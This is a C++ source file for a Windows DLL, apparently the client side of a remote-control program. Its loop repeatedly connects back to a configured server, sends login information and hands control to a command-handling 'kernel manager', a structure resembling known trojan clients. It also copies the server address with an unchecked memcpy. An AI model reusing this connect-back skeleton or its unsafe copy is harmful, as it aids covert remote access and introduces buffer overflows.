#include "Dll.h"
#include"Login.h"
#include"KernelManager.h"

char    __ServerIPAddress[MAX_PATH] = { 0 };
USHORT  __ServerConnectPort = 0;
HINSTANCE  __InstanceHandle = NULL;

BOOL  APIENTRY  DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case  DLL_PROCESS_ATTACH:
	{
		//代表一个exe(加载当前Dll模块)
		__InstanceHandle = (HINSTANCE)hModule;
		break;
	}
	case  DLL_THREAD_ATTACH:
	case  DLL_THREAD_DETACH:
	case  DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
void  ClientRun(char* ServerIPAddres, USHORT  ServerConnectPort)
{
	memcpy(__ServerIPAddress, ServerIPAddres, strlen(ServerIPAddres));
	__ServerConnectPort = ServerConnectPort;

	//启动一个工作线程
	HANDLE  ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
		NULL, 0, NULL);

	//等待工作线程的正常退出
	WaitForSingleObject(ThreadHandle, INFINITE);

	printf("Client Bye Bye!!!\r\n");
	if (ThreadHandle != NULL)
	{
		CloseHandle(ThreadHandle);
	}
	
}
DWORD WINAPI  WorkThreadProcedure(LPVOID ParameterData)
{
	_CIOCPClient  IOCPClient;
	BOOL  IsOk = FALSE;
	while (1)
	{
		if (IsOk == TRUE)
		{
			break;
		}
		DWORD  TickCount = GetTickCount();
		if (!IOCPClient.ConnectServer(__ServerIPAddress, __ServerConnectPort))
		{
			continue;
		}
		//与服务器建立了连接
		//发送第一波数据
		SendLoginInformation(&IOCPClient, GetTickCount() - TickCount);
		//构建接收数据的机制
		CKernelManager  KernelManager(&IOCPClient);

		do
		{
			IsOk = WaitForSingleObject(IOCPClient.m_EventHandle, 100);
			IsOk = IsOk - WAIT_OBJECT_0;
		} while (IsOk != 0);
		IsOk = TRUE;
	}
	return 0;
}

